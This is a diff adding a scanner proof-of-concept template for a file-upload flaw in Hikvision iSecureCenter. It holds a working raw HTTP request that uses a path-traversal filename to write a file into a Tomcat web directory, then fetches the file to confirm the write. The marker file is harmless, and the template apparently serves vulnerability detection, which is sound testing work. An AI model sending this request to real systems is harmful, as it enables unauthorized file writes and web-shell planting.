@@ -1,0 +1,39 @@
+id: poc-yaml-Hikvision-iSecureCenter-file-upload
+info:
+  name: 海康威视-iSecureCenter-综合安防管理平台文件上传漏洞
+  severity: high
+  tags:
+  - 文件上传
+  finger: iSecure-Center
+variables:
+  v1: md5(random_str(8))
+  v2: md5(random_str(8))
+requests:
+- raw: 'POST /center/api/files;.js HTTP/1.1
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    Connection: close
+
+    Content-Length: 255
+
+    Content-Type: multipart/form-data; boundary=ea26cdac4990498b32d7a95ce5a5135c
+
+
+    --ea26cdac4990498b32d7a95ce5a5135c
+
+    Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{{.v1}}.txt"
+
+    Content-Type: application/octet-stream
+
+
+    {{.v2}}
+
+    --ea26cdac4990498b32d7a95ce5a5135c--'
+  expression: status_code == 200
+- method: GET
+  path: /clusterMgr/{{.v1}}.txt;.js
+  expression: status_code == 200 && contains(body, v2)
+transport: http
